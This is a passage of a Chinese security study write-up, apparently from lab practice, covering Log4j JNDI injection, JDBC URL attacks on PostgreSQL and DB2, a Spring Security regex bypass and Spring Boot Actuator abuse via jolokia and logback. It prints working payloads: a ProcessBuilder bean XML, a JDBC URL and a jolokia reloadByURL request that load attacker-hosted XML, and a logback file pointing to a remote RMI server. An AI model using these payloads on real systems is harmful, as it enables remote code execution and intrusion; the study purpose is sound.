恶意`jndi`服务可以用[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus)起，这个漏洞因为利用非常简单，并且通杀性很强，只要服务端`JDK`版本不高，没有关`trustURLCodebase`的情况下，用户输入的内容出现在`log.info()`，`log.error()`等函数中，就可以`RCE`。

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230720152108.png)

### JDBC
> 靶场中只有这两种，jdbc可控链接反序列化RCE情形可以学习这个仓库
> `https://github.com/su18/JDBC-Attack`

#### postgres CVE-2022-21724
> 可控jdbc情形下，postgres的RCE

服务器上放的`xml`文件内容

```
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">

   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>open</value>
            <value>-a</value>
            <value>calculator</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

Payload:
`jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://47.115.225.142:7777/1.xml`

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230718153908.png)

#### DB2
最新版官方代码层也没有修复这个问题，在可控`JDBC`连接的情况下，可以通过`clientRerouteServerListJNDIName`，打`JNDI`注入，完成RCE。
![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230718203913.png)

### Spring-security CVE-2022-22978 
Spring-security的认证权限绕过。

在正则表达式中元字符`.`是匹配除换行符（`\n`、`\r`）之外的任何单个字符。如果要匹配包括 \n 在内的任何字符，需使用像(.|\n)的模式。

在这样的使用场景中
```java
    public static void main(String[] args) throws Exception{
        Pattern vuln_pattern = Pattern.compile("/black_path.*");
        Pattern sec_pattern = Pattern.compile("/black_path.*", Pattern.DOTALL);

        String poc = URLDecoder.decode("/black_path%0a/xx", StandardCharsets.UTF_8.toString());
        System.out.println("Poc: " + poc);
        System.out.println("Not dotall: " + vuln_pattern.matcher(poc).matches());    // false，非dotall无法匹配\r\n
        System.out.println("Dotall: " + sec_pattern.matcher(poc).matches());         // true，dotall可以匹配\r\n
    }
```

如果不用`Pattern.DOTALL`，就会有用`\r\n`绕过路由鉴权的问题。

### Actuators

> https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
> https://xz.aliyun.com/t/9763#toc-0

`Acututator`是用来在生产环境监控和管理应用程序的功能。

默认配置未授权访问问题出现在spring boot 1.5之前，可以未授权访问注册到一些包含敏感信息的路由，比如`/env`等等，1.5之后就不能未授权访问。而`2.x`版本之后，路由被移动到了`/actutator`下，比如说`/actutator/health`，并且只能默认情况为`enabled`，只能访问的到`health`,`info`，除非开发者手动开启`exposure`属性,才有可能可以访问到。

#### 信息泄漏

> https://github.com/JoyChou93/java-sec-code/wiki/Actuator-Information-Leakage#%E7%8E%AF%E5%A2%83

`/env` 环境变量泄漏

![image-20230622171247667](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622171247667.png)

`/trace`用户请求泄漏

![image-20230622171341901](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622171341901.png)

`/mappings`路由泄漏

![image-20230622171428393](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622171428393.png)

`heapdump` 堆栈信息泄漏，可以借助一些内存分析工具，找一些泄漏信息

actuators的未授权访问接口，不仅导致上述一些信息泄漏，还可以通过`env`,`refresh`,`shutdown`等接口进行环境变量的更新，服务配置的重新加载和服务关闭。这些问题也进一步的，在某些环境下导致了RCE的利用。

#### actuators + jolokia logback RCE

> https://xz.aliyun.com/t/4258

jolokia 是一个用来远程管理 `java` 程序的项目。在spring boot项目中，可能会需要用到`logback`（一个日志框架）来定义日志记录的行为，`logback`的默认配置文件为`logback.xml`。

> 利用条件：actuator未授权访问，有jolokia和logback，logback内容配置了`jmxConfigurator`并且已知logback配置文件名，题目出网

可以通过这个调用链打JNDI注入，完成RCE。

```
Springboot-actuator
-> jolokia
-> logback
-> jndi
-> RCE
```

漏洞原理：

1. 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 `ch.qos.logback.classic.jmx.JMXConfigurator` 类的 `reloadByURL` 方法
2. 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容
3. 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
4. xml 文件中利用 `logback` 依赖的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
5. 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞

靶机的logback设置没打开，那就是默认文件名为`logback.xml`或`logback-spring.xml`，打开后为设置的文件名，比如这里就是`logback-online.xml`。

![image-20230622232354270](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622232354270.png)

logback依赖存在的情况下，`/jolokia/list`可以搜到`ch.qos.logback.classic.jmx.JMXConfigurator`，这是payload中重要一环，具体的漏洞分析可以看上面的文章。

![image-20230622232320017](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622232320017.png)

流程是服务端加载远程`xml`文件 -> `xml`文件中用`insertFromJNDI`打`JNDI`注入，请求远程恶意`rmi`服务，加载恶意`java`类，完成RCE。

POC

服务器上放的`xml`

```xml
<configuration>
	<insertFromJNDI env-entry-name="rmi://xxx.xxx.xxx.xxx:1099/remoteExploit8" as="appName"/>
</configuration>
```

恶意rmi服务我用https://github.com/cckuailong/JNDI-Injection-Exploit-Plus起的，这个项目链子比较多，挺好用。
```
http://localhost:8080/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/xxx.xxx.xxx.xxx:xxx!/logback-online.xml
```

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230719173932.png)

#### actuators + jolokia realm RCE

有空补

#### actuators + Spring Cloud RCE

有空补